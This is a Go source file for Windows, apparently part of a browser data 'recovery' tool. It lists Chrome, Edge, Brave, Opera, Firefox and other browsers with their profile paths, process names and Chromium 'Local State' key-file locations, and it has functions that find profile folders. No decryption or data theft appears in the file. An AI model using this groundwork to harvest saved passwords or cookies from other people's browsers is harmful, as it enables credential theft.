//go:build windows

package browser

import (
	"os"
	"path/filepath"
	"strings"

	"recovery/recovery/types"
)

var Browsers = []types.BrowserConfig{
	// ── Chromium family (LOCALAPPDATA) ────────────────────────────────────────
	{Name: "Chrome", UserDataPath: `Google\Chrome\User Data`, ProcessName: "chrome.exe"},
	{Name: "Edge", UserDataPath: `Microsoft\Edge\User Data`, ProcessName: "msedge.exe"},
	{Name: "Brave", UserDataPath: `BraveSoftware\Brave-Browser\User Data`, ProcessName: "brave.exe"},
	{Name: "Vivaldi", UserDataPath: `Vivaldi\User Data`, ProcessName: "vivaldi.exe"},
	{Name: "Yandex", UserDataPath: `Yandex\YandexBrowser\User Data`, ProcessName: "browser.exe"},
	{Name: "Arc", UserDataPath: `Arc\User Data`, ProcessName: "Arc.exe"},
	// ── Opera (APPDATA, flat profile) ────────────────────────────────────────
	// ts doesn't work will fix in the future
	{Name: "Opera", UserDataPath: `Opera Software\Opera Stable`, ProcessName: "opera.exe", UseAppData: true, FlatProfile: true},
	{Name: "Opera GX", UserDataPath: `Opera Software\Opera GX Stable`, ProcessName: "opera.exe", UseAppData: true, FlatProfile: true},
	// ── Firefox family (APPDATA, Firefox profile layout) ─────────────────────
	{Name: "Firefox", UserDataPath: `Mozilla\Firefox`, ProcessName: "firefox.exe", UseAppData: true, IsFirefox: true},
	{Name: "LibreWolf", UserDataPath: `LibreWolf`, ProcessName: "librewolf.exe", UseAppData: true, IsFirefox: true},
	{Name: "Waterfox", UserDataPath: `Waterfox`, ProcessName: "waterfox.exe", UseAppData: true, IsFirefox: true},
}

func GetLocalAppData() string {
	return os.Getenv("LOCALAPPDATA")
}

func GetUserDataRoot(cfg types.BrowserConfig) string {
	base := os.Getenv("LOCALAPPDATA")
	if cfg.UseAppData {
		base = os.Getenv("APPDATA")
	}
	return filepath.Join(base, cfg.UserDataPath)
}

func LocalStatePath(cfg types.BrowserConfig) string {
	return filepath.Join(GetUserDataRoot(cfg), "Local State")
}

func FindProfileDirs(cfg types.BrowserConfig) []types.ProfileInfo {
	root := GetUserDataRoot(cfg)

	if cfg.FlatProfile {
		if _, err := os.Stat(root); err == nil {
			return []types.ProfileInfo{{Name: "Default", Path: root}}
		}
		return nil
	}

	if cfg.IsFirefox {
		return findFirefoxProfiles(root)
	}

	return findChromiumProfiles(root)
}

func findChromiumProfiles(root string) []types.ProfileInfo {
	entries, err := os.ReadDir(root)
	if err != nil {
		return nil
	}
	var profiles []types.ProfileInfo
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		prefPath := filepath.Join(root, e.Name(), "Preferences")
		if _, err := os.Stat(prefPath); err == nil {
			profiles = append(profiles, types.ProfileInfo{
				Name: e.Name(),
				Path: filepath.Join(root, e.Name()),
			})
		}
	}
	return profiles
}

func findFirefoxProfiles(root string) []types.ProfileInfo {
	profilesDir := filepath.Join(root, "Profiles")
	entries, err := os.ReadDir(profilesDir)
	if err != nil {
		return nil
	}
	var profiles []types.ProfileInfo
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		if _, err := os.Stat(filepath.Join(profilesDir, e.Name(), "prefs.js")); err == nil {
			profiles = append(profiles, types.ProfileInfo{
				Name: e.Name(),
				Path: filepath.Join(profilesDir, e.Name()),
			})
		}
	}
	return profiles
}

func IsFirefoxProfileName(name string) bool {
	parts := strings.SplitN(name, ".", 2)
	if len(parts) != 2 {
		return false
	}
	suffix := strings.ToLower(parts[1])
	return strings.HasPrefix(suffix, "default") || strings.HasPrefix(suffix, "release")
}
